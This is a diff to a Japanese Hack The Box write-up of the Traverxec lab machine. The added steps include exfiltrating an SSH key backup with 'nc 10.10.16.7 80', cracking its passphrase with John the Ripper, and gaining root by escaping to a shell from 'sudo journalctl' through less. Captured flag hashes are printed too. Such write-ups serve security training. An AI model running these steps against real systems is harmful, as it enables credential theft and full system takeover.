@@ -178,8 +178,8 @@ htpasswd                /var/nostromo/conf/.htpasswd
 homedirs                /home
 homedirs_public         public_www
 ```
-以上のことから、`/home/david/public_www`を確認  
-`index.html`などを発見
+以上のことから、ユーザホームディレクトリ内にpublic_wwwがあるとわかるので、「/home/david/public_www」を確認  
+「index.html」などを発見
 ```sh
 www-data@traverxec:/usr/bin$ cd /home/david/public_www
 cd /home/david/public_www
@@ -191,12 +191,123 @@ total 8
 drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
 ```
 [マニュアル](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#HOMEDIRS)から、ユーザホームディレクトリにアクセスする場合は、「/~`ユーザ名`」と判明  
-実際に無事アクセスできた
+さきほどの「index.html」にアクセスできた  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_02.png">  
-さらにssh鍵を発見
+さらにssh鍵のバックアップを発見、ncコマンドで配送
 ```sh
 www-data@traverxec:/home/david/public_www$ ls -l protected-file-area
 ls -l protected-file-area
 total 4
 -rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
+
+www-data@traverxec:/home/david/public_www$ cat protected-file-area/backup-ssh-identity-files.tgz | nc 10.10.16.7 80
+<ea/backup-ssh-identity-files.tgz | nc 10.10.16.7 80
+```
+ssh秘密鍵でログイン、がパスフレーズがあるもよう
+```sh
+└─$ nc -lnvp 80 > backup-identity-files.tgz                                                               
+listening on [any] 80 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.129.182.22] 48636
+^C
+
+└─$ tar -zxvf backup-identity-files.tgz 
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+
+└─$ ssh -i home/david/.ssh/id_rsa david@10.129.182.22 
+Enter passphrase for key 'home/david/.ssh/id_rsa': 
+```
+クラック成功！パスフレーズは「hunter」と判明  
+opensslでパスフレーズを解除
+```sh
+└─$ ssh2john home/david/.ssh/id_rsa > passphrase.txt
+
+└─$ john passphrase.txt            
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+hunter           (home/david/.ssh/id_rsa)     
+1g 0:00:00:00 DONE 2/3 (2025-07-20 16:36) 14.28g/s 822885p/s 822885c/s 822885C/s frodo..maverick
+Use the "--show" option to display all of the cracked passwords reliably
+
+└─$ openssl rsa -in home/david/.ssh/id_rsa -out id_rsa_david
+Enter pass phrase for home/david/.ssh/id_rsa:
+writing RSA key
+```
+sshログイン成功！ユーザフラグゲット！
+```sh                                                                                                                                                                                                                                       
+└─$ ssh -i id_rsa_david david@10.129.182.22 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+Last login: Tue Jul 22 07:28:13 2025 from 10.10.16.7
+
+david@traverxec:~$ cat user.txt
+9b8f2aa8b8a66e8f6716f393074cbf46
+```
+
+
+## STEP 4
+sudo確認はパスワードがいるもよう
+```sh
+david@traverxec:~$ sudo -l
+[sudo] password for david:
+```
+なぞのシェルスクリプトがあり確認してみると、sudoでなにか実行している模様
+```sh
+david@traverxec:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  bin  .lesshst  .profile  public_www  .ssh  user.txt
+
+david@traverxec:~$ ls -a bin
+.  ..  server-stats.head  server-stats.sh
+
+david@traverxec:~$ cat bin/server-stats.sh
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+sudoを実行すると、パスワードが求められなかった  
+多分`-n5`は５行文を出力するオプション  
+パイプ以降を抜いて実行しても、これもパスワードが求められなかった
+```sh
+david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+-- Logs begin at Mon 2025-07-21 08:56:43 EDT, end at Tue 2025-07-22 08:11:30 EDT. --
+Jul 22 01:46:08 traverxec nhttpd[1536]: /../../../../bin/sh sent a bad cgi header
+Jul 22 01:46:31 traverxec nhttpd[1538]: /../../../../bin/sh sent a bad cgi header
+Jul 22 01:50:58 traverxec nhttpd[1547]: /../../../../bin/sh sent a bad cgi header
+Jul 22 01:51:22 traverxec nhttpd[1549]: /../../../../bin/sh sent a bad cgi header
+Jul 22 02:05:56 traverxec nhttpd[1554]: /../../../../bin/sh sent a bad cgi header
+
+david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Mon 2025-07-21 08:56:43 EDT, end at Tue 2025-07-22 08:13:58 EDT. --                                      
+Jul 22 01:46:08 traverxec nhttpd[1536]: /../../../../bin/sh sent a bad cgi header                                         
+Jul 22 01:46:31 traverxec nhttpd[1538]: /../../../../bin/sh sent a bad cgi header                                         
+Jul 22 01:50:58 traverxec nhttpd[1547]: /../../../../bin/sh sent a bad cgi header                                         
+Jul 22 01:51:22 traverxec nhttpd[1549]: /../../../../bin/sh sent a bad cgi header                                         
+Jul 22 02:05:56 traverxec nhttpd[1554]: /../../../../bin/sh sent a bad cgi header 
+```
+５行文がターミナルに出力されるが、そのサイズより小さいとjournalctlは`less`コマンドに渡されるかも  
+ビンゴ！  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_03.png">  
+あとは、[リンク](https://gtfobins.github.io/gtfobins/journalctl/#sudo)どおりにシェルを開けた、ルートフラグゲット！
+```sh
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+                                                                                                          
+# cat /root/root.txt                                                                                                                                
+3ee17ab5224f06e14897ce20320f8665
 ```
